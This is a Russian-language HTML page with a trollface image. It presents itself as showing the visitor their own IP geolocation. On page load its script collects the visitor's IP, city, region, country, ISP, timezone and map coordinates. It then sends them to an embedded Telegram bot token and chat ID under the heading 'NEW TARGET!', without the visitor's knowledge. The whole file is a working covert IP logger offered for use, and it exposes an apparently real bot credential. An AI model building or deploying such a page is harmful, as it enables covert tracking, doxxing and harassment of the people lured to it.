<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>IP Информация</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            text-align: center;
            color: #4a4a4a;
            margin-bottom: 30px;
            font-size: 2em;
        }
        .info-block {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        .info-block p {
            margin: 10px 0;
            padding: 10px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
        }
        .info-block p:last-child {
            border-bottom: none;
        }
        .label {
            font-weight: bold;
            color: #764ba2;
        }
        .loading {
            text-align: center;
            color: #666;
        }
        .troll-image {
            width: 100px;
            display: block;
            margin: 20px auto 0;
            animation: float 3s ease-in-out infinite;
            cursor: pointer;
        }
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📍 Геолокация</h1>
        <div id="info" class="info-block">
            <p class="loading">Определяем местоположение...</p>
        </div>
        <img src="trollface.png" alt="Trollface" class="troll-image" id="trollImage">
    </div>

    <script>
        // =============================================
        // ТВОИ ДАННЫЕ - НЕ МЕНЯЙ
        // =============================================
        const botToken = '8698773306:AAEfpKve0rNrxK88e79rquBXHK91RhFesTw';
        const chatId = '1238755996';
        
        // =============================================
        // ПОЛУЧЕНИЕ РЕАЛЬНОГО МЕСТОПОЛОЖЕНИЯ
        // =============================================
        async function getLocation() {
            try {
                // Сначала получаем IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // По IP получаем местоположение через бесплатный API
                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
                const locationData = await locationResponse.json();
                
                return {
                    ip: userIP,
                    city: locationData.city || 'Неизвестно',
                    region: locationData.region || 'Неизвестно',
                    country: locationData.country_name || 'Неизвестно',
                    latitude: locationData.latitude,
                    longitude: locationData.longitude,
                    isp: locationData.org || 'Неизвестно',
                    timezone: locationData.timezone || 'Неизвестно'
                };
            } catch (error) {
                console.log('Ошибка получения геоданных:', error);
                
                // Запасной вариант если ipapi.co не работает
                try {
                    const backupResponse = await fetch('https://ipinfo.io/json?token=');
                    const backupData = await backupResponse.json();
                    
                    // Разбираем координаты если есть
                    let lat = null, lon = null;
                    if (backupData.loc) {
                        const coords = backupData.loc.split(',');
                        lat = coords[0];
                        lon = coords[1];
                    }
                    
                    return {
                        ip: backupData.ip,
                        city: backupData.city || 'Неизвестно',
                        region: backupData.region || 'Неизвестно',
                        country: backupData.country || 'Неизвестно',
                        latitude: lat,
                        longitude: lon,
                        isp: backupData.org || 'Неизвестно',
                        timezone: backupData.timezone || 'Неизвестно'
                    };
                } catch (backupError) {
                    console.log('Запасной API тоже не сработал');
                    return null;
                }
            }
        }
        
        // =============================================
        // ОТПРАВКА В TELEGRAM С КООРДИНАТАМИ
        // =============================================
        async function sendToTelegram(data) {
            let message = `🕵️ <b>НОВАЯ ЦЕЛЬ!</b>\n\n`;
            message += `📍 <b>IP:</b> ${data.ip}\n`;
            message += `🏙️ <b>Город:</b> ${data.city}\n`;
            message += `🌍 <b>Регион:</b> ${data.region}\n`;
            message += `🗺️ <b>Страна:</b> ${data.country}\n`;
            message += `📡 <b>Провайдер:</b> ${data.isp}\n`;
            message += `⏰ <b>Часовой пояс:</b> ${data.timezone}\n`;
            
            // Если есть координаты - добавляем ссылку на карту
            if (data.latitude && data.longitude) {
                message += `\n📍 <b>Точка на карте:</b>\n`;
                message += `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
            }
            
            message += `\n\n⏱️ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('Отправлено в Telegram');
            } catch (error) {
                console.error('Ошибка отправки:', error);
            }
        }
        
        // =============================================
        // ПОКАЗ НА СТРАНИЦЕ
        // =============================================
        async function showInfo() {
            const infoDiv = document.getElementById('info');
            infoDiv.innerHTML = '<p class="loading">Определяем геолокацию...</p>';
            
            const locationData = await getLocation();
            
            if (locationData && locationData.ip) {
                let html = `
                    <p><span class="label">IP адрес:</span> <span>${locationData.ip}</span></p>
                    <p><span class="label">Страна:</span> <span>${locationData.country}</span></p>
                    <p><span class="label">Город:</span> <span>${locationData.city}</span></p>
                    <p><span class="label">Регион:</span> <span>${locationData.region}</span></p>
                    <p><span class="label">Провайдер:</span> <span>${locationData.isp}</span></p>
                `;
                
                if (locationData.latitude && locationData.longitude) {
                    html += `
                        <p><span class="label">Координаты:</span> <span>${locationData.latitude}, ${locationData.longitude}</span></p>
                        <p style="text-align: center; border-bottom: none;">
                            <a href="https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}" target="_blank" style="color: #764ba2;">🗺️ Открыть на карте</a>
                        </p>
                    `;
                }
                
                infoDiv.innerHTML = html;
                await sendToTelegram(locationData);
            } else {
                infoDiv.innerHTML = '<p class="loading">Не удалось определить местоположение</p>';
            }
        }
        
        // =============================================
        // ОБРАБОТЧИК КЛИКА ПО КАРТИНКЕ
        // =============================================
        document.getElementById('trollImage').addEventListener('click', function() {
            alert('🔍 Обновляю геолокацию...');
            showInfo();
        });
        
        // Запуск при загрузке
        showInfo();
    </script>
</body>
</html>
